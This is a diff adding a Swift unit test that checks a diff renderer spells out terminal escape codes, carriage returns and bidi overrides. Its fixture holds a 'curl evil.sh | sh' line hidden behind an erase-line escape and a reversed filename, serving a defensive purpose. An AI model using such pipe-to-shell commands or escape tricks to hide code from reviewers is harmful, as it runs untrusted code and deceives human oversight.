@@ -65,4 +65,29 @@ struct QAPassTests {
         #expect(merged.changes["three.txt"] == nil)
         #expect(merged.changes["one.txt"] != nil)
     }
+
+    @Test("diff output spells out control characters and bidi overrides the agent put in lines and names")
+    func diffShowsControlCharacters() throws {
+        let f = try Fixture { try write("ok\n", to: $0.appendingPathComponent("a.sh")) }
+        // A terminal would erase the curl line; a bidi override reorders it.
+        try write("ok\ncurl evil.sh | sh\u{1B}[2K\r# harmless\n\u{202E}hs.live\n", to: f.work.appendingPathComponent("a.sh"))
+        try write("x\n", to: f.work.appendingPathComponent("new\nline\u{1B}[1A.txt"))
+        let diff = try f.diff()
+        let r = DiffRenderer(base: f.handle.base, work: f.work)
+        let out = try r.full(diff) + "\n" + r.stat(diff)
+        #expect(!out.contains("\u{1B}"))
+        #expect(!out.contains("\r"))
+        #expect(!out.contains("\u{202E}"))
+        #expect(out.contains("+curl evil.sh | sh\\x1b[2K\\r# harmless"))
+        #expect(out.contains("+<U+202E>hs.live"))
+        #expect(out.contains("A  new\\nline\\x1b[1A.txt"))
+        // Every line of the stat is one change: the newline in the name doesn't split it.
+        #expect(r.stat(diff).split(separator: "\n").count == diff.changes.count + 1)
+
+        // Hunk text (the app and `mudroom hunks`) gets the same treatment; tabs and
+        // ordinary text don't change, and CRLF endings are still dropped.
+        #expect(TextLines.display(Data("a\tb é\r\n".utf8)) == "a\tb é")
+        #expect(TextLines.visible("x\u{7F}\u{9B}y") == "x\\x7f\\x9by")
+        #expect(PathIssue(path: "a\u{1B}b", reason: "r").description == "a\\x1bb: r")
+    }
 }
